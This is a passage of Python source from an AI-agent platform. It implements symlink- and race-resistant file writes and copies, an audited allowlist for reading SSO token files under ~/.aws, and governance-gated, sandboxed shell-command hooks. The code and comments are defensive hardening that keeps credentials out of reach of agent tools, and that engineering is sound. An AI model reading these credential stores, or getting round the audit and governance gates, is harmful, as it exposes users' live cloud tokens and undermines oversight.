        if use_dir_fd and within_root is not None:
            dir_real = _fd_real_path(dfd)
            if dir_real is None:
                return False  # cannot verify containment -> fail closed
            root_real = os.path.realpath(within_root)
            try:
                contained = os.path.commonpath([dir_real, root_real]) == root_real
            except ValueError:
                contained = False
            if not contained or is_sensitive_path(dir_real):
                return False
        elif within_root is not None:
            # No directory handle to interrogate, so the parent is verified by
            # its resolved path. Weaker than the pinned check (a swap between
            # this and the rename is not detectable) but it still refuses a
            # parent outside the authorised root or inside a sensitive location.
            dir_real = os.path.realpath(parent)
            root_real = os.path.realpath(within_root)
            try:
                contained = os.path.commonpath([dir_real, root_real]) == root_real
            except ValueError:
                contained = False
            if not contained or is_sensitive_path(dir_real):
                return False
        # O_NOFOLLOW guards only the FINAL component, so opening the parent by
        # name leaves an INTERMEDIATE ancestor swappable between the file's
        # validation and this open: /project/a/c/doc with `a` replaced by a
        # symlink to /project/b yields a directory fd for a different `c`, and
        # the rename would overwrite /project/b/c/doc instead. Re-resolving
        # `base` through the pinned fd and requiring the SAME (dev, ino) closes
        # that: if any ancestor changed, this resolves to a different inode or
        # not at all.
        if use_dir_fd:
            try:
                dst = os.stat(base, dir_fd=dfd, follow_symlinks=False)
            except OSError:
                return False
            if (dst.st_dev, dst.st_ino) != src_ident:
                logger.warning(
                    "refusing source write to %r: the pinned parent no longer resolves to "
                    "the validated file",
                    path,
                )
                return False
            tfd = os.open(
                tmp_name,
                os.O_WRONLY | os.O_CREAT | os.O_EXCL | getattr(os, "O_NOFOLLOW", 0),
                0o600,
                dir_fd=dfd,
            )
        else:
            tfd = os.open(
                os.path.join(parent, tmp_name),
                os.O_WRONLY | os.O_CREAT | os.O_EXCL | getattr(os, "O_NOFOLLOW", 0),
                0o600,
            )
        created = True
        try:
            written = 0
            while written < len(encoded):
                written += os.write(tfd, encoded[written:])
            # Restore the target's permissions on the descriptor BEFORE the
            # rename, so the replacement is never briefly visible as 0600.
            # Via platform_compat: os.fchmod does not exist on Windows, and a
            # bare call would raise AttributeError -- which `except OSError`
            # would NOT catch, surfacing as a 500 mid-update.
            platform_compat.fchmod_safe(tfd, src_mode)
            # Carry extended attributes across the replace. The in-place write
            # this replaced preserved them for free by never changing the inode;
            # a fresh inode starts with none, which silently drops POSIX ACLs
            # (stored as system.posix_acl_access) and any user.* metadata.
            #
            # Split by what the attribute DOES, rather than one policy for all:
            #
            #  * an ACCESS-CONTROL attribute that fails to copy is a security
            #    regression -- the rename would install an inode the owner has
            #    protected less than the one it replaced -- so the write is
            #    REFUSED and the original is left untouched;
            #  * an informational `user.*` attribute is best effort, because
            #    failing closed there would make every linked write fail on a
            #    filesystem that simply does not support xattrs (tmpfs, several
            #    network mounts), which is worse than losing a tag.
            #
            # A source with NO xattrs needs nothing carried, so an unsupported
            # filesystem is not an error -- there is nothing to lose.
            #
            # Values were captured from the validated DESCRIPTOR above, so this
            # loop cannot be affected by a path that moved since.
            for attr, value in src_xattrs:
                try:
                    os.setxattr(tfd, attr, value)
                except OSError:
                    if _is_access_control_xattr(attr):
                        logger.warning(
                            "refusing source write to %r: could not carry access-control "
                            "attribute %r onto the replacement",
                            path,
                            attr,
                        )
                        return False
                    continue  # informational attribute -- keep going
            os.fsync(tfd)
        finally:
            os.close(tfd)
        # LAST-MOMENT re-check, immediately before the rename.
        #
        # rename() replaces whatever the name points at RIGHT NOW, and the
        # earlier identity check ran before the payload was staged -- a write
        # plus fsync, which on a slow filesystem is a wide window. An editor
        # doing its own atomic save in that window swaps in a NEW inode, and the
        # rename would silently overwrite content newer than what the user is
        # editing here. Re-checking last shrinks the window from "duration of
        # the staged write" to the few instructions below, and a detected change
        # REFUSES rather than clobbers.
        #
        # This is a narrowing, not a guarantee: a genuine compare-and-swap
        # rename needs renameat2(RENAME_EXCHANGE), which the stdlib does not
        # expose (and which is Linux-only). The remaining window cannot be
        # closed with os.rename, so the caller keeps its own snapshot and the
        # user's newer file wins -- the safe direction.
        try:
            pre = (
                os.stat(base, dir_fd=dfd, follow_symlinks=False)
                if use_dir_fd
                else os.stat(path, follow_symlinks=False)
            )
        except OSError:
            return False
        if (pre.st_dev, pre.st_ino) != src_ident:
            logger.warning(
                "refusing source write to %r: the file changed on disk after validation "
                "(concurrent save); not overwriting the newer content",
                path,
            )
            return False
        if use_dir_fd:
            os.rename(tmp_name, base, src_dir_fd=dfd, dst_dir_fd=dfd)
        else:
            # os.replace, not os.rename: on Windows rename REFUSES an existing
            # destination, while replace overwrites it -- and does so atomically,
            # which is the property that matters here.
            os.replace(os.path.join(parent, tmp_name), path)
        created = False  # renamed away; nothing left to clean up
        return True
    except OSError:
        return False
    finally:
        if created:
            try:
                if dfd >= 0:
                    os.unlink(tmp_name, dir_fd=dfd)
                else:
                    os.unlink(os.path.join(parent, tmp_name))
            except OSError:
                pass
        if dfd >= 0:
            try:
                os.close(dfd)
            except OSError:
                pass


def safe_copy_file_nolink(raw: str, dest_dir: str) -> str | None:
    """Copy a file into *dest_dir* with the full descriptor-pinned validation
    chain; return the private copy's path, or None if the source is rejected.

    For large binaries (media files) that libraries must consume BY PATH from
    a subprocess: the bytes are streamed from the vetted descriptor into a
    freshly created 0600 temp file inside *dest_dir*, so downstream readers
    never touch the caller-influenced original path again.

    Validation mirrors :func:`safe_read_file_bytes_nolink`: open first
    (``O_NOFOLLOW``), then ``fstat()`` on the descriptor (regular file,
    ``st_nlink == 1``), then the OPENED descriptor's real path (via
    ``/proc/self/fd`` on Linux, ``fcntl.F_GETPATH`` on macOS) must not be
    sensitive. ``O_NOFOLLOW`` only guards the FINAL path component — an
    ancestor directory swapped for a symlink between validation and open
    would otherwise reach a sensitive file. The fd-path check is pinned to
    the inode actually opened and copied, so no check-to-use window remains.
    If the fd's real path cannot be determined, fail closed.
    """
    import os
    import stat as _stat
    import tempfile

    path = validate_file_path(raw)
    if path is None:
        return None

    try:
        fd = os.open(path, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
    except OSError:
        return None
    tmp_fd = -1
    tmp_path: str | None = None
    try:
        st = os.fstat(fd)
        if st.st_nlink > 1 or not _stat.S_ISREG(st.st_mode):
            return None
        fd_real = _fd_real_path(fd)
        if fd_real is None:
            return None  # cannot verify what was opened -> fail closed
        if is_sensitive_path(fd_real):
            return None
        tmp_fd, tmp_path = tempfile.mkstemp(
            prefix=".safe-copy-", suffix=os.path.splitext(fd_real)[1], dir=dest_dir
        )
        while True:
            chunk = os.read(fd, 1 << 20)
            if not chunk:
                break
            view = memoryview(chunk)
            while view:
                written = os.write(tmp_fd, view)
                view = view[written:]
        return tmp_path
    except OSError:
        if tmp_path is not None:
            try:
                os.unlink(tmp_path)
            except OSError:
                pass
        return None
    finally:
        try:
            os.close(fd)
        except OSError:
            pass
        if tmp_fd >= 0:
            try:
                os.close(tmp_fd)
            except OSError:
                pass


def safe_read_prefix(raw: str, n: int) -> bytes | None:
    """Read the first *n* bytes of a file through is_sensitive_path enforcement.

    Like :func:`safe_read_file_bytes` but reads only a bounded prefix, for
    magic-byte / format sniffing of large binaries that exceed
    ``MAX_FILE_BYTES`` (e.g. the ~100 MB kiro-cli binary). ``validate_file_path``
    canonicalizes via ``realpath`` (following symlinks) and rejects sensitive
    resolved targets, so a symlink pointing into ``~/.aws`` etc. is refused
    before any read. The open uses ``O_NOFOLLOW`` on the canonical path as
    TOCTOU defense against a final-component symlink swap after the check.

    Returns up to *n* bytes, or None if the path is rejected or unreadable.
    """
    import os

    if n <= 0:
        return b""
    path = validate_file_path(raw)
    if path is None:
        return None
    try:
        fd = os.open(path, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
    except OSError:
        return None
    try:
        with os.fdopen(fd, "rb") as fh:
            return fh.read(n)
    except OSError:
        return None


# ---------------------------------------------------------------------------
# Internal authorized reads of sensitive paths
# ---------------------------------------------------------------------------
#
# The default ``safe_read_file`` / ``safe_read_file_bytes`` paths refuse any
# path that ``is_sensitive_path`` flags. A small set of **internal system**
# operations legitimately need to read a file ``is_sensitive_path`` blocks.
# Rather than have those callers reach for ``Path.read_bytes`` directly --
# which would scatter sensitive-path reads across the codebase and make the
# audit story ad-hoc -- they go through ``safe_read_file_internal(read_id)``,
# which consults this hardcoded allowlist, performs the read, and emits an SEL
# audit event on every outcome.
#
# Adding a new entry is a security-review event: it widens the set of sensitive
# reads that can happen outside the deny rule. Each entry's comment must justify
# why the read is system infrastructure (the bytes leaving the process never
# reach an LLM/agent surface) rather than LLM/agent-mediated content.
#
# The `backend-security-controls` rule requires reads of
# "user- or LLM-influenced paths" to pass is_sensitive_path() and explicitly
# EXEMPTS "trusted fixed-path internal ... reads". Every read_id here maps to a
# HARDCODED constant path (never derived from user/LLM/config input), the read
# is SEL-audited on every outcome and fail-closed (a success whose audit cannot
# be persisted returns None), the open is O_NOFOLLOW + fstat, and the target
# stores are themselves classified sensitive in security._SENSITIVE_HOME_DIRS
# so agent file tools cannot reach them. This is the sanctioned fixed-path
# internal case the rule exempts, not a weakening of the keystone.
_INTERNAL_READ_ALLOWLIST: dict[str, str] = {
    # ``kiro_crew.dashboard.handlers.kiro_usage_api`` reads the kiro-cli SSO
    # access token to authenticate a single ``GetUsageLimits`` call to the
    # hardcoded CodeWhisperer RTS endpoint
    # (``codewhisperer.us-east-1.amazonaws.com``) that powers the dashboard
    # credit-usage pill -- the same API the Kiro IDE credit meter uses. The
    # token bytes go only to that AWS endpoint over TLS; only the parsed numeric
    # usage dict returns to the process, and it is run through
    # ``redact_credentials``/``redact_exfiltration_urls`` before caching, so the
    # credential never reaches an LLM/agent surface. The operator already
    # trusted KiroCrew with the session by running ``kiro-cli login`` outside
    # any agent loop. (On Linux the live token lives in the kiro-cli SQLite
    # store, which is not a sensitive path; these JSON entries cover the IDE /
    # older kiro-cli cache layout.)
    "kiro_usage_api.sso_token_cli": ".aws/sso/cache/kiro-auth-token-cli.json",
    "kiro_usage_api.sso_token_ide": ".aws/sso/cache/kiro-auth-token.json",
}


def register_internal_read_path(read_id: str, rel_path: str) -> None:
    """Register an edition-contributed fixed-path internal-read carve-out.

    The composition-time seam an edition companion uses to add its own trusted
    fixed-path reads (e.g. an SSO cookie jar for the usage-upload path) to
    ``_INTERNAL_READ_ALLOWLIST`` — the exact structural twin of the boot-time
    ``register_acp_backends`` / ``register_publish_providers`` seams.  This is
    NOT an agent-reachable API: it is called once, from the companion's boot
    composition, with HARDCODED constant arguments.  It never widens what
    ``safe_read_file_internal`` will read at call time — that function still
    re-verifies the resolved path is sensitive, opens O_NOFOLLOW, and SEL-audits
    every outcome — this only lets an edition contribute an entry to the same
    guarded table the core ships.

    Guards (fail-closed, so a mis-registration cannot open a hole):

    * ``read_id`` must be a non-empty string; re-registering an existing key with
      a DIFFERENT path raises (a companion cannot silently repoint a core entry
      such as ``kiro_usage_api.sso_token_cli`` at an attacker file).  Re-
      registering the same key with the same path is idempotent.
    * ``rel_path`` must be a relative path with no ``..`` component and no
      absolute/anchor part, so the resolved target can only ever live under
      ``~`` (the read still resolves under ``Path.home()`` at call time).
    * the resolved ``~/<rel_path>`` must already be classified sensitive by
      :func:`kiro_crew.security.is_sensitive_path` — the carve-out is only valid
      for a path the shared file gate otherwise blocks; registering a
      non-sensitive path is a configuration error and raises.
    """
    if not isinstance(read_id, str) or not read_id:
        raise ValueError("register_internal_read_path: read_id must be a non-empty string")
    existing = _INTERNAL_READ_ALLOWLIST.get(read_id)
    if existing is not None and existing != rel_path:
        raise ValueError(
            f"register_internal_read_path: {read_id!r} already registered to a "
            f"different path {existing!r}; refusing to repoint",
        )
    p = Path(rel_path)
    if p.is_absolute() or p.anchor or ".." in p.parts:
        raise ValueError(
            f"register_internal_read_path: rel_path must be relative with no '..' "
            f"(got {rel_path!r})",
        )
    resolved = str((Path.home() / p).expanduser())
    if not is_sensitive_path(resolved):
        raise ValueError(
            f"register_internal_read_path: {rel_path!r} resolves to a non-sensitive "
            f"path; the carve-out is only valid for a sensitive path",
        )
    _INTERNAL_READ_ALLOWLIST[read_id] = rel_path


def safe_read_file_internal(read_id: str) -> bytes | None:
    """Read a sensitive path on behalf of an authorized internal caller.

    The ``read_id`` must be a key in ``_INTERNAL_READ_ALLOWLIST``. The
    function resolves the allowlisted path under ``~``, verifies it is in fact
    sensitive (defense in depth), reads the bytes (subject to
    ``MAX_FILE_BYTES``), emits an SEL audit event on every outcome, and returns
    the bytes -- or ``None`` if missing / unreadable / oversized.

    Raises ``PermissionError`` if ``read_id`` is not allowlisted -- callers must
    never construct ``read_id`` from untrusted input.

    Fail-closed audit: if the SEL audit for the ``success`` outcome cannot be
    recorded (backend unavailable, or the emit raised), the function returns
    ``None`` instead of the bytes -- a ``logger.warning`` is not itself an SEL
    audit event, and the carve-out's validity depends on every successful read
    producing a real audit. Callers already handle ``None`` (degrade to the
    text scrape).
    """
    if read_id not in _INTERNAL_READ_ALLOWLIST:
        _emit_internal_read_audit(read_id, "not_allowlisted")
        raise PermissionError(
            f"safe_read_file_internal denied: {read_id!r} not in allowlist",
        )

    rel_path = _INTERNAL_READ_ALLOWLIST[read_id]
    abs_path = Path.home() / rel_path
    resolved = str(abs_path.expanduser())

    # Defense in depth: the allowlist is only a meaningful carve-out if the
    # underlying path is in fact sensitive. If it has stopped being sensitive,
    # the carve-out has nothing to protect against and the configuration has
    # drifted; refuse rather than silently widen access.
    if not is_sensitive_path(resolved):
        _emit_internal_read_audit(read_id, "not_sensitive")
        raise PermissionError(
            f"safe_read_file_internal denied: {read_id!r} resolves to a "
            f"non-sensitive path; allowlist is only valid for sensitive paths",
        )

    # Open with O_NOFOLLOW so a symlink at the final path component (e.g. a
    # planted ~/.aws/sso/cache/kiro-auth-token-cli.json -> attacker file) is
    # refused, binding the read to the real allowlisted file rather than a
    # redirected target. Check + read share ONE descriptor (TOCTOU-safe), and
    # fstat confirms a regular file before reading.
    import os
    import stat

    try:
        fd = os.open(resolved, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
    except FileNotFoundError:
        _emit_internal_read_audit(read_id, "missing")
        return None
    except OSError:
        # ELOOP (final component is a symlink) and any other open error —
        # fail closed, never following the link.
        _emit_internal_read_audit(read_id, "unreadable")
        return None

    data = b""
    try:
        st = os.fstat(fd)
        if not stat.S_ISREG(st.st_mode):
            _emit_internal_read_audit(read_id, "not_regular")
            return None
        with os.fdopen(fd, "rb", closefd=True) as fh:
            fd = -1  # ownership transferred to fh; do not double-close
            data = fh.read(MAX_FILE_BYTES + 1)
    except OSError:
        _emit_internal_read_audit(read_id, "unreadable")
        return None
    finally:
        if fd != -1:
            try:
                os.close(fd)
            except OSError:
                pass

    if len(data) > MAX_FILE_BYTES:
        _emit_internal_read_audit(read_id, "too_large")
        return None

    if not _emit_internal_read_audit(read_id, "success"):
        logger.error(
            "Denying sensitive read %s: SEL audit unavailable; the carve-out "
            "requires an audit trail and the caller will see None instead of "
            "the file bytes.",
            read_id,
        )
        return None
    return data


def _emit_internal_read_audit(read_id: str, outcome: str) -> bool:
    """Emit an SEL audit event for an internal sensitive/credential read.

    Returns ``True`` iff an SEL event was recorded, ``False`` otherwise (SEL
    backend unavailable or the emit raised). ``safe_read_file_internal`` /
    ``emit_internal_read_audit`` gate the return of sensitive bytes on this
    result for ``success`` outcomes: a ``logger.warning`` is NOT itself an SEL
    audit event, so a read whose audit could not be recorded must be denied.
    """
    try:
        from kiro_crew.sel import sel
    except ImportError:  # pragma: no cover - sel optional in some test envs
        logger.warning(
            "SEL backend unavailable; internal-read audit dropped " "for read_id=%s outcome=%s",
            read_id,
            outcome,
        )
        return False
    try:
        sel().log_tool_invocation(
            session_key="hooks:safe_read_file_internal",
            tool_name=f"internal_read.{read_id}",
            outcome=outcome,
            source="hooks",
            # audit-or-deny: a "success" gates the return of live credential
            # bytes, so it must be written SYNCHRONOUSLY (critical=True drains the
            # queue and re-raises on a filesystem failure). In async SEL mode a
            # non-critical log() only ENQUEUES — a later writer-thread failure is
            # swallowed and this would wrongly return True for an audit that
            # never landed. Non-success outcomes already return None / raise, so
            # a dropped event there still leaves an observable log line.
            critical=(outcome == "success"),
        )
    except Exception:  # noqa: BLE001 - audit must never break the caller
        logger.warning(
            "SEL audit emission failed for internal read read_id=%s",
            read_id,
            exc_info=True,
        )
        return False
    return True


# Registry of sanctioned audit-only credential reads: read_id -> the
# credential-bearing location it covers. These are reads of paths that are NOT
# classified sensitive (so they cannot route through ``safe_read_file_internal``
# / ``_INTERNAL_READ_ALLOWLIST``) yet still hold a live secret and therefore owe
# the same SEL audit trail. Every entry requires the same security-review
# justification discipline as ``_INTERNAL_READ_ALLOWLIST``.
_AUDIT_ONLY_READ_IDS: dict[str, str] = {
    # kiro-cli / amazon-q SQLite auth stores: live SSO bearer token on Linux.
    # Read read-only by ``kiro_crew.dashboard.handlers.kiro_usage_api`` for the
    # single hardcoded GetUsageLimits call (see the kiro_usage_api.sso_token_*
    # justification in _INTERNAL_READ_ALLOWLIST -- identical posture, different
    # storage layout).
    "kiro_usage_api.sqlite_token": ".local/share/{kiro-cli,amazon-q}/data.sqlite3",
}


def emit_internal_read_audit(read_id: str, outcome: str) -> bool:
    """Emit an SEL audit event for a credential read that cannot route through
    :func:`safe_read_file_internal`.

    ``safe_read_file_internal`` covers reads of *sensitive paths*. Some
    credential material lives at a path that is NOT classified sensitive yet
    still holds a live secret -- e.g. the kiro-cli auth store at
    ``~/.local/share/kiro-cli/data.sqlite3``. Such a reader still owes the same
    audit trail, so it calls this wrapper with its own ``read_id`` and outcome.

    The ``read_id`` MUST be registered in ``_AUDIT_ONLY_READ_IDS`` -- this entry
    point enforces its own allowlist, mirroring the ``_INTERNAL_READ_ALLOWLIST``
    gate, so it cannot be used as an unscoped bypass of the SEL-audit surface.
    An unregistered ``read_id`` returns ``False`` without emitting, which
    callers treat as "audit unavailable" and fail closed on.
    """
    if read_id not in _AUDIT_ONLY_READ_IDS:
        logger.warning("emit_internal_read_audit: unregistered read_id %r rejected", read_id)
        return False
    return _emit_internal_read_audit(read_id, outcome)


# ── Script Hooks ──


@dataclass
class ScriptHook:
    """Executable hook that runs a shell command on a trigger event.

    Aligned with Kiro CLI hook semantics:
    - Exit 0: success (stdout → context for AgentSpawn/UserPromptSubmit)
    - Exit 2: block tool (PreToolUse only, stderr → LLM)
    - Other: warning (stderr shown to user)
    """

    id: str = ""
    name: str = ""
    event: str = HOOK_EVENT_USER_PROMPT_SUBMIT
    matcher: str = ""  # tool matcher for PreToolUse/PostToolUse (empty = all tools)
    command: str = ""  # shell command to execute
    timeout: int = 30  # seconds (Kiro CLI default is 30s)
    enabled: bool = True
    last_run: float = 0.0
    last_status: str = ""  # "ok", "error", "timeout", "blocked"
    run_count: int = 0

    def to_dict(self) -> dict:
        return asdict(self)

    @classmethod
    def from_dict(cls, data: dict) -> ScriptHook:
        # Support legacy "pattern" field as fallback for "matcher"
        matcher = data.get("matcher", data.get("pattern", ""))
        return cls(
            id=data.get("id", str(uuid.uuid4())[:8]),
            name=data.get("name", ""),
            event=data.get("event", HOOK_EVENT_USER_PROMPT_SUBMIT),
            matcher=matcher,
            command=data.get("command", ""),
            timeout=data.get("timeout", 30),
            enabled=data.get("enabled", True),
            last_run=data.get("last_run", 0.0),
            last_status=data.get("last_status", ""),
            run_count=data.get("run_count", 0),
        )


@dataclass
class ScriptHookResult:
    """Result of executing a script hook."""

    hook_id: str
    hook_name: str
    event: str
    stdout: str = ""
    stderr: str = ""
    exit_code: int = -1
    error: str = ""
    duration_ms: int = 0

    @property
    def blocked(self) -> bool:
        """PreToolUse exit code 2 = block tool."""
        return self.exit_code == 2

    @property
    def succeeded(self) -> bool:
        return self.exit_code == 0


def _script_hooks_capability_denied(session_key: str = "") -> str | None:
    """Return a denial reason if governance disables ``capabilities.script_hooks``.

    Script hooks run an operator/agent-authored shell command in a subprocess
    (``run_script_hook`` → ``/bin/sh -c``), an arbitrary code-execution surface.
    The ``capabilities.script_hooks`` gate (default OFF in the catalog) lets a
    policy/profile forbid firing them.  Best-effort beyond the always-on
    sandbox/redaction guards: a ``PlatformCompositionError`` propagates
    (fail-closed CPP); any other error degrades to "no opinion" (None) so a
    transient governance glitch cannot wedge every hook.
    """
    from kiro_crew.platform.context import PlatformCompositionError

    try:
        from kiro_crew.platform.governance_profiles import governance_permits

        # item="" → the CapabilityGate's ``enabled`` flag is what is queried.
        decision = governance_permits("capabilities.script_hooks", "", session_key=session_key)
        if not getattr(decision, "permitted", True):
            return getattr(decision, "reason", "script_hooks capability disabled")
        return None
    except PlatformCompositionError:
        raise
    except Exception:
        # Wrapped (see _governance_denial): a late-import failure must not turn the
        # soft fail-open into a hard fail that wedges every script hook.
        try:
            from kiro_crew.platform.governance_profiles import audit_governance_degraded

            audit_governance_degraded(
                "run_script_hook", session_key=session_key, scope="capabilities.script_hooks"
            )
        except Exception:
            logger.debug("governance degrade audit unavailable", exc_info=True)
        return None


async def run_script_hook(
    hook: ScriptHook, context: str = "", hook_event: dict | None = None
) -> ScriptHookResult:
    """Execute a script hook's command with timeout.

    Passes hook event as JSON via STDIN (Kiro CLI compatible).
    """
    import os

    start = time.monotonic()
    # Governance: the ``capabilities.script_hooks`` gate (default OFF) may forbid
    # running script hooks for the active surface. Checked before the subprocess
    # spawns. The session key is carried on the hook_event when a caller threads
    # it (parent_session_key); absent → policy-only resolution.
    sk = ""
    if hook_event:
        sk = str(hook_event.get("parent_session_key") or hook_event.get("session_key") or "")
    gov_denied = _script_hooks_capability_denied(sk)
    if gov_denied:
        hook.last_run = time.time()
        hook.last_status = "blocked"
        hook.run_count += 1
        try:
            from kiro_crew.sel import sel

            sel().log_governance_decision(
                session_key=sk,
                tool_name=f"run_script_hook:{hook.name or hook.id}",
                scope="capabilities.script_hooks",
                outcome="denied",
                reason=gov_denied,
            )
        except Exception:
            logger.debug("script_hook deny audit failed", exc_info=True)
        return ScriptHookResult(
            hook_id=hook.id,
            hook_name=hook.name,
            event=hook.event,
            error=f"Blocked by governance policy: {gov_denied}",
            exit_code=2,  # PreToolUse "block tool" convention
            duration_ms=int((time.monotonic() - start) * 1000),
        )
    # Build hook event JSON for STDIN
    if hook_event is None:
        hook_event = {"hook_event_name": hook.event, "cwd": os.getcwd()}
    stdin_data = json.dumps(hook_event).encode()

    try:
        # circular import: sandbox → registry → apps → hooks, so import at call time
        from kiro_crew.sandbox import cgroup_scope_argv, create_subprocess_limited, wrap_argv

        # The env var is bounded by ARG_MAX — a multi-KB Stop segment there can
        # fail subprocess creation (~32K on Windows). Cap the ENV copy only; the
        # full context still reaches the hook via the stdin JSON payload
        # (Stop -> hook_event["assistant_text"]) and drove matcher evaluation.
        env_context = context[:500] if hook.event == HOOK_EVENT_STOP else context
        env = {
            **os.environ,
            "KIROCREW_HOOK_EVENT": hook.event,
            "KIROCREW_HOOK_CONTEXT": env_context,
        }
        # Shell per platform: POSIX /bin/sh -c, Windows cmd /c (no /bin/sh there).
        # The argv is what the sandbox/cgroup chokepoints below vet, on BOTH
        # platforms — only the eventual spawn form differs (see the Windows
        # branch under the spawn).
        if platform_compat.IS_WINDOWS:
            argv = ["cmd", "/c", hook.command]
        else:
            argv = ["/bin/sh", "-c", hook.command]
        wrapped_argv, cleanup_path = wrap_argv(argv)
        wrapped_argv = cgroup_scope_argv(wrapped_argv)  # cgroup DoS ceiling
        # Process-group isolation for clean tree-kill on timeout. Pass both flags
        # explicitly (NOT **dict unpack — breaks mypy's Popen overload resolution
        # on the build fleet): start_new_session=True is a no-op on Windows,
        # creationflags resolves to 0 (no-op) on POSIX. The Windows flag makes the
        # tree taskkill /T-reapable; POSIX setsid -> killpg.
        if platform_compat.IS_WINDOWS and wrapped_argv == argv:
            # cmd.exe must receive the operator's command line VERBATIM. Spawning
            # ``["cmd", "/c", command]`` as an argv routes it through
            # ``subprocess.list2cmdline``, which backslash-escapes every quote the
            # operator wrote — so a command as ordinary as
            # ``"C:\Program Files\Python\python.exe" -c "print(1)"`` arrives as
            # ``\"C:\Program Files\...\"`` and cmd.exe answers "is not recognized
            # as an internal or external command". ``create_subprocess_shell``
            # formats ``%ComSpec% /c "<command>"`` with no argv escaping, which is
            # the same parse the operator gets typing the line at a prompt (and
            # the only form under which ``%VAR%`` and a literal ``%`` both behave
            # as written — a temp ``.cmd`` wrapper would eat both).
            #
            # Guarded on the wrap being a no-op: Windows has no sandbox or cgroup
            # backend, so neither chokepoint can prepend anything today. Should
            # one ever appear, the wrapper MUST own the spawn — that case falls
            # through to the argv path below, choosing isolation over quoting.
            proc = await asyncio.create_subprocess_shell(
                hook.command,
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                env=env,
                creationflags=platform_compat.CREATE_NEW_PROCESS_GROUP,
            )
        else:
            proc = await create_subprocess_limited(
                *wrapped_argv,
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                env=env,
                start_new_session=platform_compat.IS_POSIX,
                creationflags=platform_compat.CREATE_NEW_PROCESS_GROUP,
            )
        try:
            stdout_b, stderr_b = await asyncio.wait_for(
                proc.communicate(input=stdin_data), timeout=hook.timeout
            )
        finally:
            if cleanup_path:
                try:
                    os.unlink(cleanup_path)
                except OSError:
                    pass
        elapsed = int((time.monotonic() - start) * 1000)
        exit_code = proc.returncode or 0
        hook.last_run = time.time()
        hook.last_status = "blocked" if exit_code == 2 else ("ok" if exit_code == 0 else "error")
        hook.run_count += 1
        return ScriptHookResult(
            hook_id=hook.id,
            hook_name=hook.name,
            event=hook.event,
            stdout=stdout_b.decode(errors="replace").strip(),
            stderr=stderr_b.decode(errors="replace").strip(),
            exit_code=exit_code,
            duration_ms=elapsed,
        )
    except asyncio.TimeoutError:
        # Kill the whole process tree (shell + grandchildren) to prevent orphans.
        # platform_compat: killpg on POSIX, taskkill /T on Windows (os.killpg /
        # signal.SIGKILL are POSIX-only and would AttributeError on win32).
        try:
            if proc.returncode is None:
                # Async variant offloads the Windows taskkill spawn — the hook
                # timeout path already runs on the event loop, so we never want
                # to stall it further while taskkill.exe walks the tree
                await platform_compat.kill_process_tree_async(proc.pid, platform_compat.SIGKILL)
                await proc.communicate()
        except Exception:
            pass
        elapsed = int((time.monotonic() - start) * 1000)
        hook.last_run = time.time()
        hook.last_status = "timeout"
        hook.run_count += 1
        return ScriptHookResult(
            hook_id=hook.id,
            hook_name=hook.name,
            event=hook.event,
            error=f"Timed out after {hook.timeout}s",
            duration_ms=elapsed,
        )
    except Exception as exc:
        elapsed = int((time.monotonic() - start) * 1000)
        hook.last_run = time.time()
        hook.last_status = "error"
        hook.run_count += 1
        return ScriptHookResult(
            hook_id=hook.id,
            hook_name=hook.name,
            event=hook.event,
            error=str(exc),
            duration_ms=elapsed,
        )


# ── Script Hook Store (persistence) ──

_HOOKS_FILE = "hooks.json"


class ScriptHookStore:
    """Persist script hooks to ~/.kiro/crew/hooks.json."""

    def __init__(self, config_dir: Path | None = None):
        from kiro_crew.config.loader import config_dir as _cfg_dir

        self._dir = config_dir or _cfg_dir()
        self._path = self._dir / _HOOKS_FILE
        self._hooks: dict[str, ScriptHook] = {}
        # Mutations used to be implicitly serialised by running on the single
        # event-loop thread. They are now offloaded with asyncio.to_thread (the
        # persistence takes a file lock and fsyncs, which must not block the
        # loop), so two of them can genuinely interleave: A mutates, B mutates,
        # B persists, then A persists a snapshot taken BEFORE B's change and
        # drops it. Re-entrant because the persist path is called from inside
        # the same held section.
        self._mutex = threading.RLock()
        self._load()

    def _load(self) -> None:
        if not self._path.exists():
            return
        try:
            data = json.loads(self._path.read_text(encoding="utf-8"))
            for h in data.get("hooks", []):
                hook = ScriptHook.from_dict(h)
                self._hooks[hook.id] = hook
        except (json.JSONDecodeError, OSError) as exc:
            logger.warning("Failed to load hooks: %s", exc)

    def _save(self) -> None:
        self._write_hooks_file([h.to_dict() for h in self._hooks.values()])

    def _write_hooks_file(self, hooks_data: list[dict]) -> None:
        """Write the ``hooks`` list while PRESERVING every other top-level key.

        ``hooks.json`` is shared: this store owns the ``hooks`` key, but the
        ``register_hook`` MCP tool stores webhook resume contexts as top-level
        keys (one per hook id) in the same file. Writing ``{"hooks": [...]}``
        wholesale used to erase all of them, so any script-hook create / update /
        toggle / delete silently dropped every pending webhook context. Merge
        instead of replace.

        An unreadable file ABORTS the write rather than proceeding with "no
        foreign keys". Continuing was the earlier choice, on the reasoning that
        the script hooks were still recoverable — but the foreign keys are not:
        a corrupt read means their contents are unknown, and writing the merged
        result would replace the file with only what this store happens to hold,
        permanently erasing every registered webhook context. Refusing leaves
        both sets on disk for an operator to repair. The caller sees
        :class:`webhooks.WebhookStoreUnreadable`.

        The read-merge-write runs under the SAME ``hooks.json.lock`` the other
        writers take, and lands via atomic replace. Merging without the lock
        still loses data, just through a narrower window: a ``register_hook``
        call that commits between this read and this write is erased by the
        stale snapshot.
        """
        self._dir.mkdir(parents=True, exist_ok=True)
        with webhooks.locked(self._path):
            data: dict = {}
            if self._path.exists():
                try:
                    loaded = json.loads(self._path.read_text(encoding="utf-8"))
                    if isinstance(loaded, dict):
                        data = {k: v for k, v in loaded.items() if k != "hooks"}
                except (json.JSONDecodeError, OSError) as exc:
                    logger.warning(
                        "hooks.json unreadable, refusing to overwrite it: %s", exc
                    )
                    raise webhooks.WebhookStoreUnreadable(
                        f"{self._path.name} is unreadable; refusing to overwrite it "
                        "and erase the registered webhook contexts"
                    ) from exc
            data["hooks"] = hooks_data
            webhooks.write_json_atomic(self._path, data)

    def list_all(self) -> list[ScriptHook]:
        return list(self._hooks.values())

    def get(self, hook_id: str) -> ScriptHook | None:
        return self._hooks.get(hook_id)

    @contextmanager
    def _atomic_mutation(self):
